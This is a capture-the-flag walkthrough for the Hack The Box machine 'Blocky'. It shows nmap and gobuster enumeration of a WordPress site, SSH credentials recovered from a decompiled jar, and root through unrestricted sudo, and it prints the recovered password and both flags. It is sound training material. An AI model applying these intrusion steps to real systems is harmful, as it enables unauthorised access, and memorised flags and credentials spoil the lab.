# Blocky
>Author : Xyan1d3
>Date : 9th July 2021
>IP : 10.10.10.37
>OS : Linux
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Fri Jul  9 00:39:32 2021 as: nmap -sC -sV -oN nmap/blocky -v 10.10.10.37
Nmap scan report for blocky.htb (10.10.10.37)
Host is up (0.078s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
```

## FTP Enumeration
FTP does not have `anonymous` login enabled.

## Web Enumeration
We visit the site and find out that it is running wordpress which we try to fuzz the wordpress plugins using seclists wordpress plugin list.

### Gobuster Plugin Bruteforce
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/blocky]
└──╼ # gobuster dir -u http://10.10.10.37/ -w /usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -o wp-plugin-gobuster.out -t 25
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.37/
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/09 01:53:58 Starting gobuster in directory enumeration mode
===============================================================
/wp-content/plugins/akismet/ (Status: 200) [Size: 0]
/wp-content/plugins/hello.php (Status: 500) [Size: 0]
/wp-content/plugins/hello.php/ (Status: 500) [Size: 0]
```

The site also leaks an username `notch` which is revealed at the post author.
![[Pasted image 20210709015736.png]]

### Gobuster normal on `http://10.10.10.37`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/blocky]
└──╼ # gobuster dir -u http://10.10.10.37/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out -t 300           
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.37/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/09 14:04:16 Starting gobuster in directory enumeration mode
===============================================================
/wiki                 (Status: 301) [Size: 309] [--> http://10.10.10.37/wiki/]
/wp-content           (Status: 301) [Size: 315] [--> http://10.10.10.37/wp-content/] 
/wp-includes          (Status: 301) [Size: 316] [--> http://10.10.10.37/wp-includes/]
/javascript           (Status: 301) [Size: 315] [--> http://10.10.10.37/javascript/]  
/wp-admin             (Status: 301) [Size: 313] [--> http://10.10.10.37/wp-admin/]
/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.10.10.37/phpmyadmin/]  
/plugins              (Status: 301) [Size: 312] [--> http://10.10.10.37/plugins/]
```

We have a `plugins` directory which is listing 2 `jar` files.
![[Pasted image 20210709140755.png]]

We could download the files and decompile them with `JD-GUI` and see whats inside.

We decompile the `blocky-core.jar` using `JD-GUI` and find out that we have a credential pair which we may use to `SSH` into the box as `notch`.
![[Pasted image 20210709141345.png]]


# Initial FootHold as notch
We use the credentials obtained from the java jar and try to SSH into the box as `notch` and we get in.

|Username|Password|
|--|--|
|notch|8YsqfCTnvxAUeduzjNSXe22|

![[Pasted image 20210709141535.png]]

## Getting the User Flag
```python
notch@Blocky:~$ ls -l
total 8
drwxrwxr-x 7 notch notch 4096 Jul  2  2017 minecraft
-r-------- 1 notch notch   32 Jul  2  2017 user.txt
notch@Blocky:~$ cat user.txt ;echo
59fee0977fb60b8a0bc6e41e751f3cd5
```

# Root Escalation
On doing a simple `sudo -l` we see that we have `ALL` permission. That means we could simply do a `sudo -i` and get a shell as root.
![[Pasted image 20210709141840.png]]

## Getting the root Flag
```python
root@Blocky:~# ls -l 
total 4
-r-------- 1 root root 32 Jul  2  2017 root.txt
root@Blocky:~# cat root.txt ; echo
0a9694a5b4d272c694679f7860f1cd5f
```